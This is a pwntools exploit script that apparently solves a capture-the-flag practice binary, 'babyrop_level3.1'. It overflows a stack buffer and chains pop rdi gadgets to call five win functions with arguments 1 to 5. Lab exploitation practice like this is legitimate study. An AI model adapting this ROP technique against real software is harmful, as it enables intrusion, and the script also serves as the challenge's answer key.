from pwn import *

binary = './babyrop_level3.1'

p = process(binary)

pop_rdi = 0x0000000000401e73
win1 = 0x0000000000401c29
win2 = 0x0000000000401b49
win3 = 0x0000000000401a67
win4 = 0x0000000000401981
win5 = 0x000000000040189e
#gdb.attach(p, '''
#b * challenge+487
#''')

offset = 0x80 + 8
payload = flat(
	b'A' * offset,
	p64(pop_rdi),
	p64(1),
	p64(win1),
	p64(pop_rdi),
	p64(2),
	p64(win2),
	p64(pop_rdi),
	p64(3),
	p64(win3),
	p64(pop_rdi),
	p64(4),
	p64(win4),
	p64(pop_rdi),
	p64(5),
	p64(win5)
)
p.sendline(payload)
p.interactive()
